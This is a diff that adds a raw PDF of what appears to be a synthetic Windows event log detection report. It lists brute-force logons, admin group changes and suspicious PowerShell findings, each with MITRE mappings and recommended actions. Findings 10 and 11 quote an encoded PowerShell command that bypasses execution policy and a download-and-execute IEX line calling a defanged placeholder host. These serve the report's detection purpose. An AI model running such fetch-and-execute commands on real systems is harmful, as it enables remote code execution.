@@ -1,0 +1,561 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 6 /Kids [5 0 R 7 0 R 9 0 R 11 0 R 13 0 R 15 0 R] >>
+endobj
+3 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+4 0 obj
+<< /Length 1435 >>
+stream
+BT
+/F1 10 Tf
+50 760 Td
+14 TL
+(Windows Event Log Detection Report) Tj
+T*
+() Tj
+T*
+(Generated: 2026-06-06 15:58:16 UTC) Tj
+T*
+() Tj
+T*
+(Executive Summary) Tj
+T*
+() Tj
+T*
+(* Events analyzed: 14) Tj
+T*
+(* Rules loaded: 4) Tj
+T*
+(* Findings generated: 11) Tj
+T*
+(* Critical findings: 2) Tj
+T*
+(* High findings: 3) Tj
+T*
+(* Medium findings: 6) Tj
+T*
+() Tj
+T*
+(Detection Findings) Tj
+T*
+() Tj
+T*
+(Finding 1: Possible Brute Force Followed By Successful Logon) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-bruteforce-001) Tj
+T*
+(* Severity: High) Tj
+T*
+(* Summary: 5 failed logons followed by a successful logon.) Tj
+T*
+(* Timestamp: 2026-06-06T08:01:10Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: j.smith) Tj
+T*
+(* Source IP: 203.0.113.44) Tj
+T*
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: j.smith) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4624, 4625) Tj
+T*
+(* Related Event Count: 6) Tj
+T*
+(* MITRE ATT&CK: Credential Access - T1110 Brute Force) Tj
+T*
+(* Recommended Action: Review authentication logs, validate the source IP, and consider) Tj
+T*
+(password reset or account lockout.) Tj
+T*
+() Tj
+T*
+(Finding 2: Windows Failed Logon) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-failedlogon-001) Tj
+T*
+(* Severity: Medium) Tj
+T*
+(* Summary: Failed Windows logon event detected.) Tj
+T*
+(* Timestamp: 2026-06-06T08:01:10Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: j.smith) Tj
+T*
+(* Source IP: 203.0.113.44) Tj
+T*
+(* Process: -) Tj
+T*
+ET
+endstream
+endobj
+5 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 4 0 R >>
+endobj
+6 0 obj
+<< /Length 1563 >>
+stream
+BT
+/F1 10 Tf
+50 760 Td
+14 TL
+(* Command Line: -) Tj
+T*
+(* Target User: j.smith) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4625) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Credential Access - T1110 Brute Force) Tj
+T*
+(* Recommended Action: Check whether the failure is isolated or part of a larger) Tj
+T*
+(authentication pattern.) Tj
+T*
+() Tj
+T*
+(Finding 3: Windows Failed Logon) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-failedlogon-001) Tj
+T*
+(* Severity: Medium) Tj
+T*
+(* Summary: Failed Windows logon event detected.) Tj
+T*
+(* Timestamp: 2026-06-06T08:01:34Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: j.smith) Tj
+T*
+(* Source IP: 203.0.113.44) Tj
+T*
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: j.smith) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4625) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Credential Access - T1110 Brute Force) Tj
+T*
+(* Recommended Action: Check whether the failure is isolated or part of a larger) Tj
+T*
+(authentication pattern.) Tj
+T*
+() Tj
+T*
+(Finding 4: Windows Failed Logon) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-failedlogon-001) Tj
+T*
+(* Severity: Medium) Tj
+T*
+(* Summary: Failed Windows logon event detected.) Tj
+T*
+(* Timestamp: 2026-06-06T08:02:02Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: j.smith) Tj
+T*
+(* Source IP: 203.0.113.44) Tj
+T*
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: j.smith) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4625) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Credential Access - T1110 Brute Force) Tj
+T*
+ET
+endstream
+endobj
+7 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 6 0 R >>
+endobj
+8 0 obj
+<< /Length 1570 >>
+stream
+BT
+/F1 10 Tf
+50 760 Td
+14 TL
+(* Recommended Action: Check whether the failure is isolated or part of a larger) Tj
+T*
+(authentication pattern.) Tj
+T*
+() Tj
+T*
+(Finding 5: Windows Failed Logon) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-failedlogon-001) Tj
+T*
+(* Severity: Medium) Tj
+T*
+(* Summary: Failed Windows logon event detected.) Tj
+T*
+(* Timestamp: 2026-06-06T08:02:41Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: j.smith) Tj
+T*
+(* Source IP: 203.0.113.44) Tj
+T*
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: j.smith) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4625) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Credential Access - T1110 Brute Force) Tj
+T*
+(* Recommended Action: Check whether the failure is isolated or part of a larger) Tj
+T*
+(authentication pattern.) Tj
+T*
+() Tj
+T*
+(Finding 6: Windows Failed Logon) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-failedlogon-001) Tj
+T*
+(* Severity: Medium) Tj
+T*
+(* Summary: Failed Windows logon event detected.) Tj
+T*
+(* Timestamp: 2026-06-06T08:03:15Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: j.smith) Tj
+T*
+(* Source IP: 203.0.113.44) Tj
+T*
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: j.smith) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4625) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Credential Access - T1110 Brute Force) Tj
+T*
+(* Recommended Action: Check whether the failure is isolated or part of a larger) Tj
+T*
+(authentication pattern.) Tj
+T*
+() Tj
+T*
+(Finding 7: Windows Failed Logon) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-failedlogon-001) Tj
+T*
+ET
+endstream
+endobj
+9 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 8 0 R >>
+endobj
+10 0 obj
+<< /Length 1686 >>
+stream
+BT
+/F1 10 Tf
+50 760 Td
+14 TL
+(* Severity: Medium) Tj
+T*
+(* Summary: Failed Windows logon event detected.) Tj
+T*
+(* Timestamp: 2026-06-06T11:20:16Z) Tj
+T*
+(* Hostname: VPN-01) Tj
+T*
+(* Username: r.patel) Tj
+T*
+(* Source IP: 198.51.100.88) Tj
+T*
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: r.patel) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4625) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Credential Access - T1110 Brute Force) Tj
+T*
+(* Recommended Action: Check whether the failure is isolated or part of a larger) Tj
+T*
+(authentication pattern.) Tj
+T*
+() Tj
+T*
+(Finding 8: Privileged Group Membership Change) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-privilege-001) Tj
+T*
+(* Severity: Critical) Tj
+T*
+(* Summary: User m.chen was added to privileged group Administrators.) Tj
+T*
+(* Timestamp: 2026-06-06T10:44:08Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: admin.temp) Tj
+T*
+(* Source IP: 10.10.5.20) Tj
+T*
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: m.chen) Tj
+T*
+(* Group Name: Administrators) Tj
+T*
+(* Related Event IDs: 4732) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Persistence - T1098 Account Manipulation) Tj
+T*
+(* Recommended Action: Confirm the change was approved, review the actor account, and) Tj
+T*
+(remove unauthorized privileged access immediately.) Tj
+T*
+() Tj
+T*
+(Finding 9: Privileged Group Membership Change) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-privilege-001) Tj
+T*
+(* Severity: Critical) Tj
+T*
+(* Summary: User m.chen was added to privileged group Domain Admins.) Tj
+T*
+(* Timestamp: 2026-06-06T10:47:33Z) Tj
+T*
+(* Hostname: DC-01) Tj
+T*
+(* Username: admin.temp) Tj
+T*
+(* Source IP: 10.10.5.20) Tj
+T*
+ET
+endstream
+endobj
+11 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 10 0 R >>
+endobj
+12 0 obj
+<< /Length 1836 >>
+stream
+BT
+/F1 10 Tf
+50 760 Td
+14 TL
+(* Process: -) Tj
+T*
+(* Command Line: -) Tj
+T*
+(* Target User: m.chen) Tj
+T*
+(* Group Name: Domain Admins) Tj
+T*
+(* Related Event IDs: 4728) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Persistence - T1098 Account Manipulation) Tj
+T*
+(* Recommended Action: Confirm the change was approved, review the actor account, and) Tj
+T*
+(remove unauthorized privileged access immediately.) Tj
+T*
+() Tj
+T*
+(Finding 10: Suspicious PowerShell Execution) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-powershell-001) Tj
+T*
+(* Severity: High) Tj
+T*
+(* Summary: Suspicious PowerShell behavior detected in process or script block logs.) Tj
+T*
+(* Timestamp: 2026-06-06T09:12:21Z) Tj
+T*
+(* Hostname: HR-WS-022) Tj
+T*
+(* Username: a.johnson) Tj
+T*
+(* Source IP: -) Tj
+T*
+(* Process: powershell.exe) Tj
+T*
+(* Command Line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand) Tj
+T*
+(SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=) Tj
+T*
+(* Target User: -) Tj
+T*
+(* Group Name: -) Tj
+T*
+(* Related Event IDs: 4688) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Execution - T1059.001 PowerShell) Tj
+T*
+(* Recommended Action: Collect the full command line, review parent process activity, and) Tj
+T*
+(check endpoint telemetry for downloaded payloads.) Tj
+T*
+() Tj
+T*
+(Finding 11: Suspicious PowerShell Execution) Tj
+T*
+() Tj
+T*
+(* Rule ID: win-powershell-001) Tj
+T*
+(* Severity: High) Tj
+T*
+(* Summary: Suspicious PowerShell behavior detected in process or script block logs.) Tj
+T*
+(* Timestamp: 2026-06-06T09:12:24Z) Tj
+T*
+(* Hostname: HR-WS-022) Tj
+T*
+(* Username: a.johnson) Tj
+T*
+(* Source IP: -) Tj
+T*
+(* Process: powershell.exe) Tj
+T*
+(* Command Line: IEX \(New-Object Net.WebClient\).DownloadString\('hxxp://example-) Tj
+T*
+(update.local/a.ps1'\)) Tj
+T*
+(* Target User: -) Tj
+T*
+(* Group Name: -) Tj
+T*
+ET
+endstream
+endobj
+13 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 12 0 R >>
+endobj
+14 0 obj
+<< /Length 310 >>
+stream
+BT
+/F1 10 Tf
+50 760 Td
+14 TL
+(* Related Event IDs: 4104) Tj
+T*
+(* Related Event Count: 1) Tj
+T*
+(* MITRE ATT&CK: Execution - T1059.001 PowerShell) Tj
+T*
+(* Recommended Action: Collect the full command line, review parent process activity, and) Tj
+T*
+(check endpoint telemetry for downloaded payloads.) Tj
+T*
+ET
+endstream
+endobj
+15 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 14 0 R >>
+endobj
+xref
+0 16
+0000000000 65535 f 
+0000000009 00000 n 
+0000000058 00000 n 
+0000000148 00000 n 
+0000000218 00000 n 
+0000001705 00000 n 
+0000001831 00000 n 
+0000003446 00000 n 
+0000003572 00000 n 
+0000005194 00000 n 
+0000005320 00000 n 
+0000007059 00000 n 
+0000007187 00000 n 
+0000009076 00000 n 
+0000009204 00000 n 
+0000009566 00000 n 
+trailer
+<< /Size 16 /Root 1 0 R >>
+startxref
+9694
+%%EOF
